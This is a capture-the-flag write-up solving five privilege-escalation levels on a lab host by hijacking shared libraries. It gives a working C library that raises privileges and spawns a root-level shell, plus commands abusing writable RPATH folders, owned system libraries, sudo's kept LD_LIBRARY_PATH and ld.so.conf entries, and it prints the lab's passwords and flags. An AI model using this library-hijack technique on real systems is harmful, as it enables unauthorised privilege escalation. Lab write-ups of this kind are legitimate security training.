---
layout: default
title: Shared-Objects-Hijacking
---
### level1

I checked the required shared objects for `level1` using `ldd`:
```bash
level1@sojack:~$ ldd ./level1
        linux-vdso.so.1 (0x00007fff4d536000)
        libutils1.so => ./libutils1.so (0x00007fe72e56d000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe72e3a7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe72e579000)
```

We can see it needs `./libutils1.so`, Let's be kindly and create it for him :)

I tried to create simple program, and it crashes and said `level1` wants the function `better_printf`.
I created the next function, assumes that enough, and it worked

```C
#include <stdio.h>
#include <unistd.h>

void better_printf(char* str){
	printf("print me: %s\n", str);
	
	printf("UID before: %d\n", getuid());
	
	uid_t euid = geteuid();  
	gid_t egid = getegid();  
	setresgid(egid, egid, egid);  
	setresuid(euid, euid, euid);  
  
	printf("UID after: %d\n", getuid());

	execl("/bin/bash", NULL);
}

```

As you can see, I print the real user UID before and after the changing, and then spawn a shell.
Let's compile it:

```bash
gcc -shared -fPIC -o libutils1.so evil.c
```

and then execute to get shell as higher user, and grab the password:

![[Pasted image 20260311234406.png]]

```bash
level1-cracked@sojack:~$ cat .passwd
RUNPATH_should_be_absolute
```

So, the first password is **RUNPATH_should_be_absolute**

### level2

In this case, the binary can't find the exact location of our shared object:

```bash
level2@sojack:~$ ldd ./level2
        linux-vdso.so.1 (0x00007ffce87d8000)
        libutils2.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f32d1fa5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f32d2172000)
```

So, it doesn't find the file `libutils2.so`:
```bash
level2@sojack:~$ ./level2
./level2: error while loading shared libraries: libutils2.so: cannot open shared object file: No such file or directory
```

Okay, let's check using `readelf` dynamic data about `level2`, why it can't find the shared object:

```bash
level2@sojack:~$ readelf -d ./level2

Dynamic section at offset 0x2dd8 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libutils2.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000f (RPATH)              Library rpath: [/home/level2/libs/]
```

As we can see, `RPATH` is set to look at `/home/level2/libs/`. Let's add our evil shared object to this folder, which we'll create too. Same steps as level1.

![[Pasted image 20260312000313.png]]

```bash
level2-cracked@sojack:~$ cat .passwd
RPATH_is_old_but_still_might_exist
```

So, the password is **RPATH_is_old_but_still_might_exist**

### level3

This time it executes find, we can see the shared object located at `/lib/libutils3.so`.

```bash
level3@sojack:~$ ./level3
Hello world
level3@sojack:~$ ldd ./level3
        linux-vdso.so.1 (0x00007ffd13d5c000)
        libutils3.so => /lib/libutils3.so (0x00007f119b44f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f119b28e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f119b460000)
```

I checked for the permission over this shared object:

```bash
level3@sojack:~$ ls -la /usr/lib/libutils3.so
-rwxr-xr-x 1 level3 level3-cracked 15896 Oct 16  2019 /usr/lib/libutils3.so
```

We are the owner of the file, let's put our new cute shared object there

![[Pasted image 20260312000945.png]]

```bash
level3-cracked@sojack:~$ cat .passwd
check_permissions_of_dependencies
```

and the password is **check_permissions_of_dependencies**

### level4

again, problems finding the shared object:

```bash
level4@sojack:~$ ./level4
./level4: error while loading shared libraries: libutils4.so: cannot open shared object file: No such file or directory
level4@sojack:~$ ldd level4
        linux-vdso.so.1 (0x00007ffe8bb4f000)
        libutils4.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb046a3b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb046c08000)
```

I checked using `readelf` for some more places the loader might be looking for:

```bash
level4@sojack:~$ readelf -d level4

Dynamic section at offset 0x2de8 contains 27 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libutils4.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

Nothing popped up to me, also `/etc/ld.so.conf.d/` didn't gave me nothing.
Then, I checked for `sudo` permissions, we can see with have `sudo` as higher user without password, and also it keeps `LD_LIBRARY_PATH`.

```bash
level4@sojack:~$ sudo -l
Matching Defaults entries for level4 on www:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=LD_LIBRARY_PATH

User level4 may run the following commands on www:
    (level4-cracked) NOPASSWD: /home/level4/level4
```

Okay, let's try to execute it with `LD_LIBRARY_PATH` pointing to our folder. Notice that it won't work with `SUID` binary, because it is being executed under different user, and the env variables aren't being saved.

```bash
level4@sojack:~$ sudo -u level4-cracked LD_LIBRARY_PATH=~ ~/level4
Hello world
```

It works, now let's generate our malicious shared object:

![[Pasted image 20260312002300.png]]

```bash
level4-cracked@sojack:/home/level4$ cat .passwd
sudoers_defaults_protects_against_setuid_abuse
```

and the password is **sudoers_defaults_protects_against_setuid_abuse**.

### level5

Again, I checked for the dependencies, the binary can't run:

```bash
level5@sojack:~$ ./level5
./level5: error while loading shared libraries: libutils5.so: cannot open shared object file: No such file or directory
level5@sojack:~$ ldd level5
        linux-vdso.so.1 (0x00007ffc1f1b6000)
        libutils5.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe11e127000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe11e2f4000)
```

However, this time we can see something interesting at `/etc/ld.so.conf.d/`:

```bash
level5@sojack:~$ ls -la /etc/ld.so.conf.d/
total 20
drwxr-xr-x  2 root root 4096 Oct 16  2019 .
drwxr-xr-x 70 root root 4096 Mar 11 23:24 ..
-rw-r--r--  1 root root   18 Oct 16  2019 level5.conf
-rw-r--r--  1 root root   44 Mar 21  2016 libc.conf
-rw-r--r--  1 root root  100 May  1  2019 x86_64-linux-gnu.conf
level5@sojack:~$ cat /etc/ld.so.conf.d/level5.conf
/home/level5/libs
```

I know it goes through all `*.conf` files under `/etc/ld.so.conf.d/`, so the loader will look for our shared object at `/home/level5/libs`.

Let's create our malicious shared object:

![[Pasted image 20260312003135.png]]

The reason it is still not working, because we need to update the cache of the loader, using the command `ldconfig`:

```bash
level5@sojack:~$ ldd ./level5
        linux-vdso.so.1 (0x00007fff30586000)
        libutils5.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007feb16ce2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007feb16eaf000)
level5@sojack:~$ ldconfig
ldconfig: Can't create temporary cache file /etc/ld.so.cache~: Permission denied
level5@sojack:~$ ldd ./level5
        linux-vdso.so.1 (0x00007ffc02eaa000)
        libutils5.so => /home/level5/libs/libutils5.so (0x00007fcc10829000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcc10668000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fcc1083a000)
```

![[Pasted image 20260312003330.png]]

```bash
level5-cracked@sojack:~$ cat .passwd
ld.so.conf_should_stay_standard_Congrats_btw_the_chall_is_over!
```

and the last password **ld.so.conf_should_stay_standard_Congrats_btw_the_chall_is_over!**.

We also got this cute `gg.txt`:

![[Pasted image 20260312003414.png]]

Okay, now concating the passwords to get the final password **76e244e666995b9dbfe175a5144a9a4ca0a4a999bb45f1165c017fa4c65e143b**

![[Pasted image 20260312003608.png]]

We also have `sudo` permission and can read the flag at `/passwd`:
```bash
level5-cracked@sojack:~$ sudo -l
Matching Defaults entries for level5-cracked on www:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User level5-cracked may run the following commands on www:
    (ALL : ALL) NOPASSWD: /bin/cat /passwd
level5-cracked@sojack:~$ sudo /bin/cat /passwd
a8ccfadb9cd1552419a80ebf1306aa93a8ccfadb9cd1552419a80ebf1306aa93

```